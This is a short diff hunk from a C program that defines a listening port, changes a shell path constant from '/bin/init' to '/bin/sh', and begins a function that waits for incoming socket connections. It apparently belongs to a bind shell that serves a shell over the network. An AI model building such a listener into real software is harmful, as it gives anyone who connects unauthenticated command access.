@@ -9,7 +9,7 @@
 #include <ctype.h>
 
 #define PORT_NUM       12345
-#define SHELL_NAME     "/bin/init"
+#define SHELL_NAME     "/bin/sh"
 
 int wait_incoming() {
   int sock0, sock;
